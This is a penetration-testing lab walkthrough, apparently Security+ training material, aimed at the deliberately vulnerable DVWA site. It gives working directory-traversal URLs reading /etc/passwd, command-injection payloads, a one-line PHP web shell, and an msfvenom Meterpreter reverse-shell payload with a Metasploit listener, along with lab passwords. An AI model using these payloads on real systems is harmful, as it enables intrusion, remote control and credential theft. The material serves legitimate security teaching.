# Assisted Lab: Performing Penetration Testing

## Objective

This activity is designed to test your understanding of and ability to apply content examples in the following CompTIA Security+ objectives:

2.4 Given a scenario, analyze indicators of malicious activity.
5.5 Explain types and purposes of audits and assessments.

### Skills Learned
[Bullet Points - Remove this afterwards]

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used
[Bullet Points - Remove this afterwards]

- dvwa.structureality.com
- Terminal Emulator
- Metasploit Framework

## Steps

### Directory traversal

Directory traversal, or file path traversal, represents a web security flaw that enables an attacker to read various files on the web server where an application is running. This may encompass application code, backend system credentials, data, and sensitive operating system files. The vulnerability emerges when an application employs data that is controllable by the user (user-provided/untrusted data) to unsafely access files and directories on the application server or another backend file system. By providing manipulated input, an attacker could potentially read arbitrary content from any location on the file system being accessed, typically with the same access level as the application or user executing the script.

    - DVWA or Damn Vulnerable Web Application is a safe and legal security playground that security professionals can use to improve their skills and learn tools and techniques related to web attacks and exploitations. DVWA is designed to be installed into a private (i.e., non-Internet) lab environment for internal use. Do NOT install DVWA on a production or an Internet-accessible system.

1. Connect to the KALI virtual machine and sign in as root using Pa$$w0rd as the password.

2. Launch the Firefox browser by selecting the Firefox ESR icon in the Kali top icon menu.

3. Maximize the Firefox window.

4. In the Firefox address bar, enter dvwa.structureality.com

5. If prompted, type admin and password into the Username and Password fields, respectively, then select Login.

    - In a real-world situation, you would attempt to exploit any input field you discover. However, with DVWA, you must first log in to the application itself to access the attack target elements.

6. The Welcome to Dann Vulnerable Web Application! page should be displayed.

    - If you scroll to the bottom of any DVWA page, you will see a footer that indicates several values, including the security level. To change the security level, select DVWA Security from the left-side navigation menu bar, make a selection from the pull-down list, then select Submit. This lab assumes the default security level of Low.

7. In the left-side navigation menu bar, select File Inclusion.

8. The Vulnerability: File Inclusion page should be displayed.

    - You will be using this sub-page of the DVWA website for exploring directory traversal exploitations rather than using it for its namesake (i.e., file inclusion).

9. Notice the URL displayed in the Firefox address bar:

    dvwa.structureality.com/vulnerabilities/fi/?page=include.php
10. Modify the URL to add "blah/" into the URL as follows:

    dvwa.structureality.com/vulnerabilities/fi/?page=blah/include.php
    - This is an initial test to verify that the "blah/" directory does not exist. This should result in a blank main page (although the DVWA header and left-side menu will still be displayed). There should be error statements above the DVWA header. Both errors and successful query results will be displayed above the DVWA header.

11. Modify the URL to add "blah/../" into the URL as follows:

    dvwa.structureality.com/vulnerabilities/fi/?page=blah/../include.php
    - This is a test to determine if the website supports the "change to parent directory" instruction. If so, you should see the "Vulnerability: File Inclusion" page (which was displayed when you first selected the File Inclusion item from the left-side navigation menu bar)

    - The "../" characters represent a "change to parent directory" instruction, just as "cd .." is used at a terminal or command prompt. The presence of these characters in a URL is to perform directory traversal. If a website is vulnerable to directory traversal, you can access files and directories outside the webroot directory.

12. Modify the URL to attempt to access the "etc/passwd" file as follows:

    dvwa.structureality.com/vulnerabilities/fi/?page=etc/passwd
    - This attempt purposefully does not have a leading slash in front of the etc directory.

    - This test checks to see if the website supports relative references to a known file. In this instance, you should see a blank result.

13. Modify the URL to attempt to access the "/etc/passwd" file as follows:

    dvwa.structureality.com/vulnerabilities/fi/?page=/etc/passwd
    - The only difference between this and the previous URL test is the inclusion of the leading forward slash before the etc directory name.

    - This test checks to see if the website supports absolute references to a known file. In this instance, you should see the display of the contents of the /etc/passwd file. This implies that you do not need to use numerous changes to parent directory instructions to reach the root of the drive. You can simply provide an absolute reference to a file.

14. Modify the URL to attempt to access the "/etc/passwd" file using a change to parent instruction as follows:

    - dvwa.structureality.com/vulnerabilities/fi/?page=../etc/passwd
    - This URL attempts to move up one parent directory before attempting to enter the etc directory. This should have a blank result. This indicates that the etc directory is not located in the immediate parent of the web root directory for the current website.

15. Add additional "../" in front of the etc directory reference to create a relative reference URL to view the passwd file.

16. Attempt to access the shadow file using the following URL:

    dvwa.structureality.com/vulnerabilities/fi/?page=/etc/shadow
    - This should result in an error of "Permission denied". That is because while there is a shadow file present, it is only accessible to the root account, not the web visitor account you are operating under. Notice that this means there is no distinction between when you type in an incorrect reference to a file you can access versus when you type in a correct reference to a file that you do not have permission to access.

17. Determine the OS version through directory traversal by accessing the version file from the /proc directory using the following URL:

    dvwa.structureality.com/vulnerabilities/fi/?page=/proc/version
18. Since every process has a file in the proc directory, you can retrieve lots of information through this technique. Experiment with the following filenames from the /proc directory:
    - cpuinfo
    - devices
    - locks
    - meminfo
    - misc
    - modules
    - uptime

19. Leave Firefox open.

Directory traversal can be used to access any file regardless of its directory container as long as the web user context has read privileges to the file.

#### Check your work

Confirm that you tested for directory traversal vulnerabilities.

Confirm that you exploited directory traversal vulnerabilities.

### Command Injection

Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Typically, the threat actor injects the commands by exploiting an application vulnerability, such as insufficient input validation. In this exercise, you will be exploiting command injection vulnerabilities on a website.

1. Connect to the KALI virtual machine and, if needed, sign in as root using Pa$$w0rd as the password.

2. Return to the web browser focused on DVWA.

3. In the left-side navigation menu bar, select Command Injection.

4. The Vulnerability: Command Injection page should be displayed.

5. Type 10.1.16.66 into the Enter an IP address field, then select Submit.

    You should see a result of a ping operation with four (4) replies.

    - This causes the website to perform a ping operation against a remote system. This IP address is in use by the Kali VM, but any accessible IP address could be used.

6. Type 127.0.0.1; ls -la into the Enter an IP address field, then select Submit to test to see if a command injection will work.

    - This command injection test introduces an additional instruction after the IP address using a semi-colon. The semi-colon can be used to stack commands.

    - The loopback IP address is used to minimize the time involved in performing the ping operation so that the injected command will execute faster.

    You should see the ping result followed by a listing of files from the directory hosting the file(s) which created this page (i.e., the web root directory). Notice the index.php file and source directories.

7. Type 127.0.0.1 && cat index.php then select Submit.

    - Many command separators or combiner symbols may be used in a web form command injection, including semi-colon, double ampersands, and vertical pipe.

  You should see the ping operation followed by the contents of the index.php file. However, the browser will still attempt to render the contents of index.php as if it was HTML.

    - Notice that with both of these stacked commands, you still have to wait for the ping function to complete.

8. Type ; ls -la source then select Submit.

  This command displays the contents of the source directory within the web root.
  
    - You can often skip or bypass a form field's intended function by ignoring the request for a specific value and starting with a semi-colon before your injected command(s).

9. Type ; ls -la .. then select Submit.

  This command displays the contents of the parent folder of the web root. This is effectively combining command injection with directory traversal.

10. Type ; whoami; hostname; ip a; pwd; uptime then select Submit.

  This command displays the user context, hostname, IP and interface information, current working directory, and system uptime.

11. Type the following into the Enter an IP address field, then select Submit.

    ; ls ../; echo ...; ls ../../; echo ...; ls ../../../
    - In this injection, you are interspersing your own delimiter to separate the output from each listing command. This can make interpreting the results a little easier.

  You should see a listing of the contents of the immediate parent folder, then three dots, then the contents of the next parent folder, then three dots, then the contents of the next parent folder.

12. Type |cat /etc/passwd then select Submit.

  You should see the contents of the /etc/passwd file.

    - The accounts listed in the passwd file are for the host OS, not the website. The website has its own independent accounts database and authentication service. So, while you may see similar/same account names from the OS and the website, they are different accounts. The users of those accounts could use the same password or different passwords.

  You can use your imagination and think up other commands to perform through the vulnerable website.

13. Leave Firefox open.

You have now performed command injection attacks using a variety of separator/combiner symbols to enumerate details about a target system.

#### Check your work

Confirm that you tested a web input form page for the command injection weakness.

Confirm that you exploited command injection weakness to perform system information discovery.

### Exploiting file upload vulnerabilities

File upload is the ability to allow visitors to a website to post files to the web server. This is a dangerous capability because it is often misconfigured. A common issue is that visitors can reference their uploaded files from modified URLs. This can be used to post false pages to a web server to fool victims or run code uploaded to the website.

In this exercise, you will discover the file upload vulnerability, then exploit it.

1. Connect to the KALI and, if needed, sign in as root using Pa$$w0rd as the password.

2. Return to the web browser focused on DVWA.

3. In the left-side navigation menu bar, select File Upload.

4. The Vulnerability: File Upload page should be displayed.

5. Open a Terminal window.

6. Enter pwd to confirm you are in the /root directory.

7. Enter cp /usr/share/xsser/gtk/images/world.png world.png

  This command copies an image file into the Kali root user's home folder for easier use (i.e., less directory path typing later!).

8. Enter ls -l to confirm world.png is present in the /root directory.

9. Minimize the Terminal window and switch back to the web browser.

10. On the Vulnerability: File Upload page, select Browse….

11. Select Home, then double-click world.png.

12. Select Upload.

  You should see the result of ../../hackable/uploads/world.png successfully uploaded!.

13. Modify the URL in the Firefox address bar using this uploaded file path so that the URL is as below, then press ENTER:

    http://dvwa.structureality.com/vulnerabilities/upload/../../hackable/uploads/world.png
    - You can copy the new URL stub from the result and paste it into the address bar to append the existing URL. Before pasting, delete the final octothorp (i.e., #).
  
    - Also, notice that you don't need vulnerabilities/upload/../.. in the URL, as this is just causing the resolution process to enter into two sub-folders, only to revert out to the original parent (i.e., the web root). You could shorten this URL to just http://dvwa.structureality.com/hackable/uploads/world.png. Notice that this is what you see now in the Firefox address bar while viewing the world map image.

  You should see a grey map of the world.

  This confirms that you can upload files to this website and then call them with a customized URL. You have discovered and confirmed that a website has a file upload vulnerability. Now, exploit that vulnerability.

14. Switch to the Terminal window.

15. Enter vim special.php
  
  This command will open VIM and create a new file named special.php stored in /root.

16. Type i to enter insert mode. The message -- INSERT -- should be present at the bottom of the screen.

17. Type the following:

  <?php system($_REQUEST["cmd"]); ?>

  This simple PHP script will execute commands presented to it via a URL. It is effectively a malicious remote control script.

18. Once finished, press ESC to exit insert mode.

    - Pressing ESC may cause your browser to exit full-screen mode. If that occurs, press ESC a second time to exit VIM's insert mode. Then, you can re-enable full-screen mode from the Display lab interface menu.

19. Enter :wq to save and quit VIM.

20. Enter cat special.php to view the contents of this file.

  Confirm the code is accurate. If not, repeat the vim command to re-open and correct it.

21. Minimize the Terminal window and switch back to the web browser.

22. Select the Go back one page left-arrow button on the Firefox toolbar.

23. The Vulnerability: File Upload page should be displayed.

24. Select Browse….

25. Double-click special.php.

    - If you are not shown the last used folder (i.e., /root), select Home.

26. Select Upload.

27. You should see the result of ../../hackable/uploads/special.php successfully uploaded!.

    You have now uploaded a simple PHP command shell to the target website.

    - A shell is a remotely accessible capability to run commands and/or code on a victim system. The term shell usually implies a command line interface (CLI), such as remotely controlling a Windows Command Prompt or a Linux Bash shell. However, there are graphical user interface (GUI) shells, such as VNC.

28. Modify the URL in the Firefox address bar using this uploaded file path so that the URL is as shown below, then press ENTER:

  http://dvwa.structureality.com/hackable/uploads/special.php
    - You can copy the new URL stub from the result and paste it into the address bar to append the existing URL. Before submitting the URL, delete the final octothorp (i.e., #).

  You should see an error as a result. Specifically, the error states that there is a "blank command" which cannot be executed. This error results because no commands were sent to the special.php command shell as parameters.

29. Modify the URL of http://dvwa.structureality.com/hackable/uploads/special.php to add ?cmd=ls to the end so that it reads as the following, then press ENTER.

    http://dvwa.structureality.com/hackable/uploads/special.php?cmd=ls
30. You should see the filenames of dvwa_email.png, special.php, and world.png.

    - Other files may be present in addition to these three.

31. Change the injected command in the URL to pwd.

  You should see the directory name of /var/www/dvwa.structureality.com/public_html/hackable/uploads.

32. Craft and try command injection URLs for each of the following:
    - directory listing of the parent folder: ?cmd=ls+../
    - directory listing of the 2nd parent folder: ?cmd=ls+../../
    - directory long listing of the 2nd parent folder: ?cmd=ls+-l+../../
    - user context for command shell: ?cmd=whoami
    - system name of website: ?cmd=hostname
    - IP addresses of website's interfaces: ?cmd=ip+a
    - contents of the passwd file: ?cmd=cat+/etc/passwd
    
    - You can construct other command statements. Just use a plus sign (i.e., + ) to represent a space.

    - From here, you can explore on your own. What else can you discover about the target? What can you do on the target?

    - This exercise is an example of a command injection. You used a file upload vulnerability to upload a PHP command shell, then injected commands to that shell to run against the underlying OS. This type of shell is often called a bind shell. This name is derived from the concept of binding a command receiving service to a listening port on a victim.

33. Leave all windows open.

The ability to upload a file to a website and then call upon that uploaded file is a severe vulnerability. You will exploit this weakness further in the next exercise in this lab, where you will establish a web shell.

#### Check your work

Confirm that you confirmed a website has a file upload weakness.

Confirm that you exploited a file upload vulnerability to plant a remote control PHP tool.

Confirm that you used an uploaded PHP file to run commands against the victim web server host.

### Establishing a web shell

In the previous exercise, you discovered that the website of Structureality has a file upload vulnerability. In this exercise, you will exploit this same vulnerability to establish a web shell. A web shell is a means to enable a reverse shell through running code on a victim web server.

1. Connect to the KALI and, if needed, sign in as root using Pa$$w0rd as the password.

2. Return to the Terminal window.

3. Enter the following:

    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.16.66 LPORT=9999 -f raw > shell.php
    This command will create a web shell exploit payload. It uses a variant of the generic reverse TCP shell payload programmed in PHP to run on a web server that supports PHP.

4. It may take up to 30 seconds before the command completes. However, when it does, it will display the following:

    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    No encoder specified, outputting raw payload
    Payload size: 34849 bytes

    - If you do not get this output, especially if the Payload size is different. Repeat the msfvenom command and double-check your typing.

5. Enter ls -l to confirm the existence of shell.php.

6. Use Metasploit to create a listener to receive the reverse shell using the following commands:
    - Enter msfconsole to launch Metasploit.
    - Enter use exploit/multi/handler
    - Enter set payload php/meterpreter_reverse_tcp
    - Enter set LHOST 10.1.16.66
    - Enter set LPORT 9999
    - Enter show options to confirm the settings are correct.
    - Enter run
   The listener is now waiting for the web shell to connect from the victim/target website.

7. Switch back to the web browser.

8. Go back to the DVWA website.

    - In the address bar, enter dvwa.structureality.com. If you are not signed in already, use admin as the username and password as the password.

9. Select File Upload.

10. Select Browse….

11. On the File Upload window, select shell.php from the right pane, then select Open.

12. You are returned to Firefox, showing the Vulnerability: File Upload page.

13. Select Upload.

14. You should see the message ../../hackable/uploads/shell.php successfully uploaded!.

    Using this path and file information, you can create a URL to call upon your uploaded file to execute it. Next, you will trigger the reverse web shell and confirm the connection was established.

15. In the Firefox address bar, enter dvwa.structureality.com/hackable/uploads/shell.php

    Eventually, Firefox will display a nearly blank page with just the characters of "/*" displayed. However, you do not need to wait for the blank screen result.

16. Return to the terminal window.

17. You should now see the statement "Meterpreter session 1 opened" and a prompt of "meterpreter >".

    This result indicates that a reverse web shell connection was established.

    - A reverse shell establishes a listening service on an attacker-controlled system. Then, tricking the victim system into connecting outbound to the listening service. A reverse shell is often used when a firewall prevents inbound initiations to a bind shell. This ability to establish a connection to a reverse shell across a firewall from an internal system to an external system is due to the lax configuration of the egress (i.e., outbound) filtering rules. A web shell is simply any shell that is established or initiated through a web server.

18. Enter sysinfo to view details about the victim system

19. Enter getuid to reveal the user account privileges context.

20. Enter help to view a list of other commands supported by the PHP meterpreter shell.

    - The PHP meterpreter shell is not as capable as the full shellcode variant used directly against an OS. Therefore, not all expected commands and capabilities are present.

21. You can experiment with some of the available commands.

22. Enter exit to terminate the reverse web shell connection.

    - This exercise was an example of remote code execution. With an RCE, actual programming code is executed, whereas, with a command injection, it's an (OS) command being executed. You created the programming code using the msfvenom tool to create shell.php

#### Check your work

Confirm that you created a PHP shell payload using msfvenom.

Confirm that you used a website's file upload vulnerability to plant the web shell exploit.

Confirm that you configured Metasploit as a listener.

Confirm that you executed the web shell exploit.

Confirm that you established and used a reverse web shell.
